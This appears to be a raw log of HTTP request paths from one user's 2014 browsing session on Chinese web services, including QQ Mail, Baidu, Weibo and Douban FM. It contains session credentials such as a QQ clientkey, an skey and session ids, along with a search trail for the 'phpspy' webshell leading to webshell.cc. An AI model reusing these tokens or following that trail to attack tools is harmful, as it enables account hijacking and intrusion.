+/?ver=4399&rkey=9B2A3B9F46D77B00E57259E22F0D9026924FACC76C7B4CA38D8655514A41AA4614E0476ABD01EED20C05E1CDFF0DC2E2DDAA8F711B9E3364AFC1FF43E8FDE07E
+/pingd?dm=show.qq.com.hot&url=&tt=qq%u79C0 - %u767E%u53D8%u968F%u5FC3%uFF0C%u65F6%u5C1A%u6211%u5148%uFF01&hottag=client.aio.usertype.notrd_nake_pv&hotx=9999&hoty=9999&rand=61871
+/cgi-bin/bottle_panel?sid=gPH-LI_XXPWMjQJW&t=bottle&plpfrom=webmail&loc=today,,,33
+/su?wd=&json=1&p=3&sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023&req=2&cb=jQuery1102015968087827786803_1417222074232&_=1417222074233
+/dev/api/?tn=playlist&special=flash&prepend=&format=json&id=public_tuijian_suibiantingting&callback=packFmLoadSongs&_=1417222074392
+/zh_CN/htmledition/style/bottle/bottle21b21f.css
+/zh_CN/htmledition/images/bottle/ad/ad_default_app1e6b31.jpg
+/zh_CN/htmledition/images//spacer.gif
+/zh_CN/htmledition/images/bottle/qrcode_app_download21ac8e.png
+/zh_CN/htmledition/images//bottle/magic/salvage.png
+/cgi-bin/qqshow_user_props_info
+/cgi-bin/getinvestigate?sid=gPH-LI_XXPWMjQJW&kvclick=getinvestigate|bottle|rightad|display
+/zh_CN/htmledition/js/bottle/csscombine/skin020f751.js
+/qqshow?clientuin=137845642&clientkey=3A00BA39BE271BA60FBE8F40844CA0076595265A26224D3FAD5061722F623F05&opuin=137845642&ptlang=2052
+/zh_CN/htmledition/js//qmfw20a8ea.js
+/zh_CN/htmledition/images/bottle/bg16ab7a.png
+/zh_CN/htmledition/js/bottle/bottle_first21b775.js
+/zh_CN/htmledition/images/bottle/skin/skin_island0104470.png
+/zh_CN/htmledition/images/bottle/bg_sand104470.png
+/cgi-bin/speed_report?stat=bottle_panel|show&13=1&r=0.23983961855992675
+/zh_CN/htmledition/images/bottle/wave_bg16ab79.png
+/cgi-bin/qqshow_user_gdt_ad?adposcount=1&freshinfo={"expire":"","value":""}&freqinfo=null&posid=1&uin=137845642&skey=@IJ8bTqr53&frienduin=494467347&ext={"req":{"friendqq":"494467347","qqshow":"1","sex":"M"}}&opencount=9&cmd=query&action=1
+/zh_CN/htmledition/images/bottle/skin/weather/flash_cove104470.gif
+/zh_CN/htmledition/images/bottle/loading_cover104470.gif
+/zh_CN/htmledition/images/bottle/icon104470.png
+/ps_default.gif?_t=1417222074249
+/data/music/fmlink?songIds=913574,919810,1787453,2129053,30935825,7280546,16590332,401765,1515291,288912&callback=packFmLoadSongsMore&_=1417222074826
+/zh_CN/htmledition/images/bottle/skin0newyear/skin_boat_christmas104470.png
+/ps_default.gif?_t=1417222074249
+/ps_default.gif?_t=1417222074249
+/img/pc.gif?_t=126
+/public03/pc.gif?_t=1417222074249
+/ps_default.gif?_t=1417222074249
+/ps_default.gif?_t=1417222074249
+/ps_default.gif?_t=1417222074249
+/zh_CN/htmledition/js/bottle/bottle_after21b775.js
+/cgi-bin/getqqicon?uin=2410259313&loc=plp
+/zh_CN/htmledition/images/bottle/skin/weather/flash_sunshine104470.gif
+/zh_CN/htmledition/images/bottle/noavator104470.png
+/zh_CN/htmledition/images/bottle/favour_panel_bg_new1bd1ef.png
+/zh_CN/htmledition/images/bottle/skin0newyear/bg_toolbar_decorate104470.png
+/zh_CN/htmledition/images/bottle/btn_bottle_new17e32b.png
+/zh_CN/htmledition/images/bottle/close_icon104470.png
+/cgi-bin/bottle_attr
+/cgi-bin/getqqicon?uin=0
+/c/msdownload/update/software/defu/2014/11/mpas-d_bd_1.189.620.0_15f509c4f957ac56e2c2c43270be8d06b19d048f.exe
+/zh_CN/htmledition/images/bottle/skin/bg_cloud104470.png
+/cgi-bin/getqqicon?uin=YA0774A0D65AEB92F&loc=plp
+/cgi-bin/getqqicon?uin=0&loc=plp
+/cgi-bin/speed_report?stat=bottle_panel|cache&1=80&2=196&3=65&4=27&5=336&6=47&7=703&r=0.6154604686889797
+/cgi-bin/speed_report?stat=bottle_panel|page|chrome&3=366&4=5640&5=5640&6=5640&7=5640&8=5640&9=5640&10=5642&11=5767&12=5882&13=5769&14=6391&15=6419&16=6422&17=6903&18=6903&19=7114&_=1417222162677
+/cgi-bin/bottle_list?r=1417222162674&listtype=bottle_collect&page=0&pagesize=512&truepage=0&sid=gPH-LI_XXPWMjQJW&plpfrom=webmail&resp_charset=UTF8&ef=js
+/v1.0/app.js?v=1.0.120322
+/201411/28/szszaw_qPs_201411284116.jpg
+/call?from=webapi&version=v1&tmp=i329hfjk
+/welcome/announce
+/platform
+/c/msdownload/update/software/defu/2014/11/mpas-d_bd_1.189.620.0_15f509c4f957ac56e2c2c43270be8d06b19d048f.exe
+/pc/misc/connect/configs/qqface_configs_v2.json
+/c/msdownload/update/software/defu/2014/11/mpas-d_bd_1.189.620.0_15f509c4f957ac56e2c2c43270be8d06b19d048f.exe
+/t4/appstyle/expression/ext/normal/e5/soap_org.gif
+/thumbnail/644838c1gw1emqjanh2h2j20yg74px6p.jpg
+/thumbnail/6106a4f0jw1emquy72oa5j20g089x7wh.jpg
+/thumbnail/005LO9GTjw1emqtut16vuj318g0wytda.jpg
+/1733838873/50/5705257472/0
+/thumbnail/67584819jw1emqu94ceuvj21qt29hhdt.jpg
+/thumbnail/e49ee862jw1emqsxuouhxj20dc16vdm3.jpg
+/square/78e4b8d4gw1emqrnh1hhfj20dw0a475a.jpg
+/cgi-bin/bottle_read?r=1417222164047&mailid=UYA0774A0D65AEB92F_LP0028-~NWaRdUZsVYhSnktTgi8U4b&mode=false&loc=bottle_read,,,1&psize=20&porder=1&history=&sid=gPH-LI_XXPWMjQJW&plpfrom=webmail&resp_charset=UTF8&ef=js
+/square/78e4b8d4gw1emqrnndznhj20bl05ijrk.jpg
+/thumbnail/e5298966gw1emqrsrjbljj20sb0gr3zg.jpg
+/thumbnail/a23f5a3fjw1emqqq7ob3uj20hs0dcq5a.jpg
+/1981622273/50/5611210324/1
+/thumbnail/761d2801jw1emqswyagu2j20me1lmamn.jpg
+/t4/appstyle/expression/ext/normal/b6/sb_org.gif
+/cgi-bin/bottle_read?r=1417222165398&mailid=UY4D7F9F153C2495AF_LP0025-Ihf6kpJjREEyRwFVokHoc4b&mode=false&loc=bottle_read,,,1&psize=20&porder=1&history=&sid=gPH-LI_XXPWMjQJW&plpfrom=webmail&resp_charset=UTF8&ef=js
+/Login/self_information
+/bmiddle/644838c1gw1emqjanh2h2j20yg74px6p.jpg
+/bmiddle/6106a4f0jw1emquy72oa5j20g089x7wh.jpg
+/bmiddle/005LO9GTjw1emqtut16vuj318g0wytda.jpg
+/bmiddle/67584819jw1emqu94ceuvj21qt29hhdt.jpg
+/bmiddle/e49ee862jw1emqsxuouhxj20dc16vdm3.jpg
+/bmiddle/e5298966gw1emqrsrjbljj20sb0gr3zg.jpg
+/bmiddle/a23f5a3fjw1emqqq7ob3uj20hs0dcq5a.jpg
+/bmiddle/761d2801jw1emqswyagu2j20me1lmamn.jpg
+/information/progress
+/CRL/Omniroot2025.crl
+/c/msdownload/update/software/defu/2014/11/mpas-d_bd_1.189.620.0_15f509c4f957ac56e2c2c43270be8d06b19d048f.exe
+/MFQwUjBQME4wTDAJBgUrDgMCGgUABBQmECJms4f7i5EbxtN7NbzQCBwAdAQUUa8kJpz0aCJXgCYrO0ZiFXsezKUCE1oAAETSXs3W6NrshQYAAQAARNI=
+/poll?r=0.11925404721121036&u=345402597&s=7&k=-olgoDNk5WyWFNdd&t=0&i=30&r=0.16003202475417755
+/cv?uuid=46b4d68ba5105b8ca0eef622747b0d2a&tc=1641146
+/v3/safeup_miniup64.cab?autoupdate=true&pid=h_inst&uid=1&mid=2b23e47f7d616140467dd06bc8b3a911&ver=9.7.0.2001&sysver=6.1.7601.256.1.1&pa=x64&type=tray&rt=1&lt=0&ue=1&language=chs
+/c/msdownload/update/software/defu/2014/11/mpas-d_bd_1.189.620.0_15f509c4f957ac56e2c2c43270be8d06b19d048f.exe
+/index.html
+/index.html
+/poll?r=0.08663497143425047&u=648629762&s=7&k=H3mhqTxNAk6pJpqp&t=0&i=30&r=0.8490985238458961
+/c/msdownload/update/software/defu/2014/11/mpas-d_bd_1.189.620.0_15f509c4f957ac56e2c2c43270be8d06b19d048f.exe
+/welcome/rank
+/platform/event_refresh
+/v3/dswtb.dat/dswtb.dat.1.0.0.2666-1.0.0.2667.cab
+/c/msdownload/update/software/defu/2014/11/mpas-d_bd_1.189.620.0_15f509c4f957ac56e2c2c43270be8d06b19d048f.exe
+/c/msdownload/update/software/defu/2014/11/mpas-d_bd_1.189.620.0_15f509c4f957ac56e2c2c43270be8d06b19d048f.exe
+/p/js6/6.0b1411141811//pattern/standard/css/gibx_custom.css
+/information/progress
+/poll?r=0.5381137782242149&u=915910623&s=7&k=tslONqY336_XNnSx&t=0&i=30&r=0.828135447576642
+/Login/self_information
+/Login/userpage
+/Login
+/m/lc/img/readYellow/26/2/promPic.png
+/
+/Login/self_information
+/su?wd=&json=1&p=3&sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023&req=2&cb=jQuery11020550767173524946_1417222089699&_=1417222089700
+/dev/api/?tn=playlist&special=flash&prepend=&format=json&id=public_tuijian_suibiantingting&callback=packFmLoadSongs&_=1417222089904
+/Login
+/Login/inner_announce
+/data/music/fmlink?songIds=7312517,1295330,591350,2685493,13801117,235701,5414339,2113823,406470,1566104&callback=packFmLoadSongsMore&_=1417222090349
+/dev/api/?tn=usercounts&callback=packFmWriteToken&t=1417222090502
+/v.gif?pid=304&ref=radio&source=pcwidget-newindex&username=DarkDcBoy&page=baidu_home&expoitem=pcwidget&type=exposure
+/ting/pic/item/08f790529822720e5d9a3bdd79cb0a46f21fab45.jpg
+/static/flash/fmp_mp3.swf?_t=1417222090504
+/v3/safeup_url64.cab?autoupdate=true&pid=h_home_haohua&uid=1&mid=115687e33b61d4b20b39b8be4358a79f&ver=9.7.0.2001&sysver=6.3.9600.256.1.0&pa=x64&type=tray&rt=1&lt=0&ue=1&language=chs
+/cache/fpid/chromelib_1_1.js?_=1417222089701
+/home/xman/data/superload?type=weather&_req_seqid=0xf954a50f0006ad13&asyn=1&t=1417222090773&sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023
+/v3/safeup_url64.cab?autoupdate=true&pid=h_home_haohua&uid=1&mid=115687e33b61d4b20b39b8be4358a79f&ver=9.7.0.2001&sysver=6.3.9600.256.1.0&pa=x64&type=tray&rt=1&lt=0&ue=1&language=chs&gslb=1
+/home/xman/data/tipspluslist?_req_seqid=0xf954a50f0006ad13&asyn=1&t=1417222090797&sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023
+/home/msg/data/personalcontent?num=8&_req_seqid=0xf954a50f0006ad13&asyn=1&t=1417222090809&sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023
+/home/xman/data/treasuretips?_req_seqid=0xf954a50f0006ad13&asyn=1&t=1417222090832&sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023
+/home/pack/data/fmlrc?qstr=/data2/lrc/122142503/122142503.lrc&_req_seqid=0xf954a50f0006ad13&asyn=1&t=1417222090846&sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023
+/v.gif?mod=superplus:skeleton&submod=skeleton&utype=&superver=superplus&portrait=74f64461726b4463426f79510d&glogid=3329287246&type=2011&pid=315&version=PCHome&terminal=PC&qid=0xf954a50f0006ad13&sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023&super_frm=&from_login=&from_reg=&query=&curcard=3&curcardtab=&_r=0.9868672650773078&m=superplus:skeleton_modShow&logactid=1100000000&showTab=3&opType=refresh
+/v.gif?mod=superplus:weather&submod=weather_tpl&utype=&superver=superplus&portrait=74f64461726b4463426f79510d&glogid=3329287246&type=2011&pid=315&version=PCHome&terminal=PC&qid=0xf954a50f0006ad13&sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023&super_frm=&from_login=&from_reg=&query=&curcard=3&curcardtab=&_r=0.030624695122241974&m=superplus:weather_weatherShow&logactid=5000000000&showType=weatherMod
+/Login/inner_announce
+/img/pc.gif?_t=874
+/ps_default.gif?_t=1417222089746
+/ps_default.gif?_t=1417222089746
+/ps_default.gif?_t=1417222089746
+/ps_default.gif?_t=1417222089746
+/ps_default.gif?_t=1417222089746
+/ps_default.gif?_t=1417222089746
+/su?wd=p&json=1&p=3&sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023&req=2&cb=jQuery11020550767173524946_1417222089699&_=1417222089702
+/public03/pc.gif?_t=1417222089746
+/home/msg/data/personalcontent?callback=jQuery11020550767173524946_1417222089703&num=8&_req_seqid=&sid=&_=1417222089704
+/ps_fp.htm?pid=superplus&fp=106136C80B3FDBDA36C6C75C604C4328&im=0&wf=1&br=2&qid=0xf954a50f0006ad13&bi=43BAF1A08E4428CCD57A7A69786FAD62:FG=1
+/service/update2/crx?os=win&arch=x86&nacl_arch=x86-64&prod=chrome&prodchannel=stable&prodversion=30.0.1599.101&wow64=1&x=id=mimojjlkmoijpicakmndhoigimigcmbb&v=11.9.900.117&fp=&uc&x=id=oimompecagnajdejgnnjijobebaeigek&v=0.0.0.0&fp=&uc&x=id=hfnkpimlhhgieaddgfemjhofmfblmnib&v=1933&fp=&uc&x=id=hnimpnehoodheedghdeeijklkeaacbdc&v=0.1.0.12181&fp=&uc&x=id=npdjjkjlcidkjlamlmmdelcjbcpdjocm&v=101.3.21.141&fp=&uc
+/s?ie=utf-8&newi=1&mod=11&isbd=1&isid=43BAF1FAD6222682&wd=ph&rsv_spt=1&issp=1&f=8&rsv_bp=0&rsv_idx=2&ie=utf-8&tn=baiduhome_pg&rsv_sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023&_ss=1&clist=&hsug=&csor=2&_cr1=21085
+/su?wd=ph&json=1&p=3&sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023&req=2&cb=jQuery11020550767173524946_1417222089703&_=1417222089705
+/v3/safeup_app64.cab?autoupdate=true&pid=h_inst&uid=1&mid=2cb85187c0c823b1da7738cc2c94ae03&ver=9.7.0.2001&sysver=6.1.7600.256.1.0&pa=x64&type=tray&rt=1&lt=0&ue=1&language=chs
+/s?ie=utf-8&newi=1&mod=11&isbd=1&isid=43BAF1FAD6222682&wd=php&rsv_spt=1&issp=1&f=8&rsv_bp=0&rsv_idx=2&ie=utf-8&tn=baiduhome_pg&rsv_sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023&_ss=1&clist=&hsug=&csor=3&_cr1=21198
+/su?wd=php&json=1&p=3&sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023&req=2&cb=jQuery11020550767173524946_1417222089703&_=1417222089706
+/popo/launch?c=cHA9JnV1aWQ9Y2JhNjQ1ZDQ0ZWMxZjMxOTRkNGEyNDY3ZDEyYzYyOGMmY29tcGlkPWR1YmEsd2Vpc2hpJnN2ZXI9V2luOCZsYXN0cG9wdGltZT0wJmdsPSZwaWQ9d2Vpc2hpJnZlcnNpb249NC43LjAuNDIwNyZsaWQ9MCZoaWQ9MCZjb21pZD04ODQmdmlwPQ==
+/v3/safeup_app64.cab?autoupdate=true&pid=h_inst&uid=1&mid=2cb85187c0c823b1da7738cc2c94ae03&ver=9.7.0.2001&sysver=6.1.7600.256.1.0&pa=x64&type=tray&rt=1&lt=0&ue=1&language=chs&gslb=1
+/s?ie=utf-8&newi=1&mod=11&isbd=1&isid=43BAF1FAD6222682&wd=phps&rsv_spt=1&issp=1&f=8&rsv_bp=0&rsv_idx=2&ie=utf-8&tn=baiduhome_pg&rsv_sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023&_ss=1&clist=&hsug=&csor=4&_cr1=21314
+/su?wd=phps&json=1&p=3&sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023&req=2&cb=jQuery11020550767173524946_1417222089703&_=1417222089707
+/s?ie=utf-8&newi=1&mod=11&isbd=1&isid=43BAF1FAD6222682&wd=phpsp&rsv_spt=1&issp=1&f=8&rsv_bp=0&rsv_idx=2&ie=utf-8&tn=baiduhome_pg&rsv_sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023&_ss=1&clist=&hsug=&csor=5&_cr1=21427
+/su?wd=phpsp&json=1&p=3&sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023&req=2&cb=jQuery11020550767173524946_1417222089703&_=1417222089708
+/s?ie=utf-8&newi=1&mod=11&isbd=1&isid=43BAF1FAD6222682&wd=phpspy&rsv_spt=1&issp=1&f=8&rsv_bp=0&rsv_idx=2&ie=utf-8&tn=baiduhome_pg&rsv_sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023&_ss=1&clist=&hsug=&csor=6&_cr1=21549
+/su?wd=phpspy&json=1&p=3&sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023&req=2&cb=jQuery11020550767173524946_1417222089703&_=1417222089709
+/v.gif?mod=superplus:ps&submod=sindex&utype=&superver=superplus&portrait=74f64461726b4463426f79510d&glogid=3329287246&type=2011&pid=315&version=PCHome&terminal=PC&qid=0xf954a50f0006ad13&sid=7734_10091_1448_10168_7802_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10066_9770_10096_10007_10236_10256_9978_9023&super_frm=&from_login=&from_reg=&query=phpspy&curcard=3&curcardtab=&_r=0.573607946978882&m=superplus:ps_searchBtnClick&logactid=1200200001&opType=click&openMode=current&wd=phpspy
+/pae/common/api/invitation?type=get&cb=jQuery11020550767173524946_1417222089703&_=1417222089710
+/v3/markers/counts
+/v.gif?pid=307&type=3075&l=182156&t=100&s=70731&v=643&f=112000&r=http://zone.wooyun.org/&u=http://zone.wooyun.org/content/16892
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1366x768&ep=183586,114626&et=3&fl=15.0&ja=1&ln=zh-CN&lo=0&lt=1417221878&nv=0&rnd=730939535&si=3faf3a47435cc512f3b86dc12af100d0&st=4&su=http://zone.wooyun.org/&v=1.0.70&lv=3
+/2/remind/unread_count.json?uid=1992245353&unread_message=1&group_id=221102260100003958&source=140226478
+/2/attitudes/to_me_status.json?count=1&page=1&source=140226478
+/it/u=77956796,2674379087&fm=96&s=ED52E512510E454D0ECD35DE030050B0
+/it/u=325674634,3805351097&fm=96&s=AFD0EA02532E86ED0ED1650D0000D0C3
+/c.gif?t=0&q=phpspy+2014&p=0&pn=1
+/safe_update
+/r/collect?v=1&_v=j31&a=1358306573&t=event&_s=5&dl=http://douban.fm/&ul=zh-cn&de=UTF-8&dt=泪光雨 - 豆瓣FM - Beta&sd=24-bit&sr=1366x768&vp=1366x615&je=0&fl=11.2 r202&ec=Song&ea=Liked&el=User&_utma=58778424.106212170.1391845699.1398858598.1399079046.32&_utmht=1417222184337&_u=OACCAAQEI~&jid=1999817676&cid=106212170.1391845699&tid=UA-7019765-3&_r=1&z=950684178
+/j/mine/playlist?type=r&sid=1392013&pt=74.3&channel=0&pb=64&from=mainsite&r=9db95d6d24
+/safehmpg_e1ea3e1c90bfbe0aa946bbe9d274acbb_5.3.0.2901.cab
+/config/config.dat
+/ps_fp.htm?pid=ps&fp=106136C80B3FDBDA36C6C75C604C4328&im=0&wf=1&br=2&qid=ebff0d320001bfb8&bi=43BAF1A08E4428CCD57A7A69786FAD62:FG=1
+/rotate_ad?cid=0
+/collect?v=1&_v=j31&a=1358306573&t=event&_s=6&dl=http://douban.fm/&ul=zh-cn&de=UTF-8&dt=泪光雨 - 豆瓣FM - Beta&sd=24-bit&sr=1366x768&vp=1366x615&je=0&fl=11.2 r202&ec=Song&ea=Skipped&_utma=58778424.106212170.1391845699.1398858598.1399079046.32&_utmht=1417222184800&_u=OACCAAQEI~&jid=&cid=106212170.1391845699&tid=UA-7019765-3&z=592447021
+/j/mine/playlist?type=s&sid=1392013&pt=74.7&channel=0&pb=64&from=mainsite&r=8ff4480339
+/?unit=dale_fm_channel&uid=45653119&bid=gBM4qwMKrG4&ip=218.75.123.171&crtr=4:0|3:/rotate_ad?cid=0&ts=1417222185004&prv=&debug=false&callback=erebor_C7249DD30D04497589539538451B0807
+/view/dale-online/dale_ad/public/10fe4cfca98be81.jpg
+/count/?ad=111005&uid=45653119&bid=gBM4qwMKrG4&unit=dale_fm_channel&ip=218.75.123.171&crtr=4:0|3:/rotate_ad?cid=0&mark=&hn=gardner5&ns=1417222184499160299&type=impression
+/x.gif?k=1015668&p=4-lwv0&rt=2&ns=[M_ADIP]&ni=[M_IESID]&na=[M_MAC]&v=[M_LOC]&o=
+/4422.html
+/checker
+/cgi-bin/qqshow_user_props_info
+/qqshow?clientuin=137845642&clientkey=3A00BA39BE271BA60FBE8F40844CA0076595265A26224D3FAD5061722F623F05&opuin=137845642&ptlang=2052
+/cgi-bin/qqshow_user_gdt_ad?adposcount=1&freshinfo={"expire":"","value":""}&freqinfo=null&posid=1&uin=137845642&skey=@IJ8bTqr53&frienduin=494467347&ext={"req":{"friendqq":"494467347","qqshow":"1","sex":"M"}}&opencount=9&cmd=query&action=1
+/wp-content/themes/webshell/style.css
+/welcome
+/stat.php?id=3310357&web_id=3310357
+/stats?sId=9387616
+/wp-content/plugins/jquery-colorbox/themes/theme9/colorbox.css?ver=4.6
+/wp-content/plugins/wp-pagenavi/pagenavi-css.css?ver=2.70
+/wp-content/plugins/cleaner-gallery/css/gallery.min.css?ver=20130526
+/wp-content/plugins/jumpdown/css/style.css
+/wp-includes/js/jquery/jquery.js?ver=1.11.1
+/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1
+/j/mine/rec_explanation
+/lpic/s4639944.jpg
+/wp-content/plugins/jquery-colorbox/js/jquery.colorbox-min.js?ver=1.3.21
+/wp-content/plugins/jquery-colorbox/js/jquery-colorbox-wrapper-min.js?ver=4.6
+/wp-content/plugins/wordpress-thread-comment/wp-thread-comment.js.php?jsver=common
+/wp-content/plugins/wordpress-thread-comment/wp-thread-comment.js.php?jsver=ajax&wpajaxeditcomments=true
+/wpad.dat
+/wp-content/plugins/akismet/_inc/form.js?ver=3.0.2
+/information/progress
+/thumbnail/644838c1gw1emqrsmi0b9j20sy0dhdkd.jpg
+/3881480761/50/22881110281/1
+/1731832263/50/5647791383/1
+/1941793810/50/5671849623/1
+/thumbnail/68b06ad9jw1emqrjvt6vwj20g00qoq4c.jpg
+/square/45cc0a71jw1emqmuf2kgvj20dc0hsdi0.jpg
+/square/45cc0a71jw1emqmufcrk5j20dc0hs3zx.jpg
+/1648587064/50/1270606633/1
+/square/e35bf36ajw1emqocl2o4uj20hs0dcwh7.jpg
+/square/e35bf36ajw1emqocw7yosj20dc0hsta2.jpg
+/thumbnail/8f56e205jw1emqqqi53jxj20f00qoq3m.jpg
+/square/61e34c96jw1emqku80qjcj20go15owi4.jpg
+/square/61e34c96jw1emqkuc1wjmj20go15ogpd.jpg
+/square/61e34c96jw1emqkuisnbgj20go15ogp2.jpg
+/square/61e34c96jw1emqkumotiej20go15ogpg.jpg
+/square/61e34c96jw1emqkufebo5j20go15on0l.jpg
+/square/61e34c96jw1emqkv211wkj20go15owhn.jpg
+/square/61e34c96jw1emqkupzc5cj20go15odjs.jpg
+/square/61e34c96jw1emqkv2g9x5j20go15odj5.jpg
+/square/61e34c96jw1emqkv54p26j20go15oadm.jpg
+/thumbnail/63918611gw1emqg7pv849j20fv07n0th.jpg
+/thumbnail/d6eb2b02gw1emqodt12q1j211y0lc78i.jpg
+/1220670672/50/40011755597/1
+/201411290849/80bd2b282be820ba630a1c734236816c/view/song/small/p1488128.mp4
+/bmiddle/644838c1gw1emqrsmi0b9j20sy0dhdkd.jpg
+/platform
+/download/HelperUpdate.htm
+/bmiddle/68b06ad9jw1emqrjvt6vwj20g00qoq4c.jpg
+/bmiddle/8f56e205jw1emqqqi53jxj20f00qoq3m.jpg
+/bmiddle/d6eb2b02gw1emqodt12q1j211y0lc78i.jpg
+/bmiddle/63918611gw1emqg7pv849j20fv07n0th.jpg
+/download/TBHprofileForQQ.ini
+/Login/userpage
+/Login/self_information
+/Login/self_information
+/static/css/index/userpage.css
+/static/image/logout_icon_2.png
+/poll?r=0.36709693586453795&u=815922797&s=7&k=nqyEMXtnbf6hMD8p&t=0&i=30&r=0.1686778706498444
+/download/HelperUpdate.htm
+/pingd?dm=www.webshell.cc&pvi=7294048256&si=s534589440&url=/4422.html&arg=&ty=&rdm=www.baidu.com&rurl=/s&rarg=wd=phpspy%202014&rsv_spt=1&issp=1&f=3&rsv_bp=0&rsv_idx=2&ie=utf-8&tn=baiduhome_pg&rsv_enter=1&rsv_sug3=6&rsv_sug4=304&rsv_sug1=6&rsv_pq=8733169f0001e5c7&rsv_t=5a43%2BfX%2FAnVnRTxX%2Fvkbh1JpzARnthuG8mXapsKTPBKe84FcYczlqhQFPi%2BkYdW5OWxZ&oq=phpspy&rsv_sug2=0&rsp=0&inputT=2949&adt=&r2=9387616&r3=-1&r4=1&fl=15.0&scr=1366x768&scl=24-bit&lg=zh-cn&jv=1&tz=-8&ct=&ext=adid=&pf=&random=1417222101237
+/imgd?IDKEY=6083a12792936e85bc4f1ad57cd483b600bc23ee740a3d12&pic=49 &r=0.9040197144796394
+/h.js?b100bd7915fcf5327d1533fadbfc026b
+/platform
+/qconn/wpa/button/button_91.gif
+/stat.htm?id=3310357&r=http://www.baidu.com/s?wd=phpspy%202014&rsv_spt=1&issp=1&f=3&rsv_bp=0&rsv_idx=2&ie=utf-8&tn=baiduhome_pg&rsv_enter=1&rsv_sug3=6&rsv_sug4=304&rsv_sug1=6&rsv_pq=8733169f0001e5c7&rsv_t=5a43%2BfX%2FAnVnRTxX%2Fvkbh1JpzARnthuG8mXapsKTPBKe84FcYczlqhQFPi%2BkYdW5OWxZ&oq=phpspy&rsv_sug2=0&rsp=0&inputT=2949&lg=zh-cn&ntime=none&cnzz_eid=44241315-1417221210-http://www.baidu.com/&showp=1366x768&t=WebShell三剑客（...&h=1&rnd=249092605
+/core.php?web_id=3310357&t=z
+/Login/userpage
+/
+/interface/pcright/pcright_topic.php?psid=PDPS000000051603&wbVersion=v6&uid=1731708303&ip=60.12.8.170&cursor=8&eData=30.95,5&callback=wbad_14172503773597&rnd=14172628517498
+/pc/mpqq/20141128/452.jpg
+/pc/mpqq/20141128/451.jpg
+/pc/mpqq/20141128/454.jpg
+/pc/mpqq/20141128/453.jpg
+/pc/mpqq/20141128/455.jpg
+/img/baidu_jgylogo3.gif?v=17185395.gif
+/r/www/cache/static/global/js/all_instant_search1_802ebaf3.js
+/r/www/cache/static/home/js/nu_instant_search_a00890f0.js
+/r/www/cache/static/sug/js/bdsug_input_event_d1352a8d.js
+/su?wd=&json=1&p=3&sid=10148_10278_1424_9993_7800_10268_10211_10121_10210_10017_10178_9498_10051_10065_9770_10096_10007_10236_10257_9979_9024&req=2&cb=jQuery1102012100974307395518_1417222192260&_=1417222192261
+/static/superplus/js/sbase_ba25f32f.js
+/static/superplus/js/min_super_e8fb243b.js
+/static/message/js/mt_show_1.6.js
+/static/superplus/js/min_notice_964fc933.js
+/home/xman/data/superload?type=weather&_req_seqid=0x95d90fd90006cb5f&asyn=1&t=1417222193319&sid=10148_10278_1424_9993_7800_10268_10211_10121_10210_10017_10178_9498_10051_10065_9770_10096_10007_10236_10257_9979_9024
+/static/tipsplus/js/min_tips_eaae4a0c.js
+/static/activity/js/activity_start_f7a2402b.js
+/static/trealayer/js/trealayer_init_bafbc6d0.js
+/home/msg/data/personalcontent?num=8&_req_seqid=0x95d90fd90006cb5f&asyn=1&t=1417222193413&sid=10148_10278_1424_9993_7800_10268_10211_10121_10210_10017_10178_9498_10051_10065_9770_10096_10007_10236_10257_9979_9024
+/home/xman/data/tipspluslist?_req_seqid=0x95d90fd90006cb5f&asyn=1&t=1417222193426&sid=10148_10278_1424_9993_7800_10268_10211_10121_10210_10017_10178_9498_10051_10065_9770_10096_10007_10236_10257_9979_9024
+/static/trealayer/css/treasure_init_81a3b70d.css
+/static/trealayer/js/trealayer_min_b68d834a.js
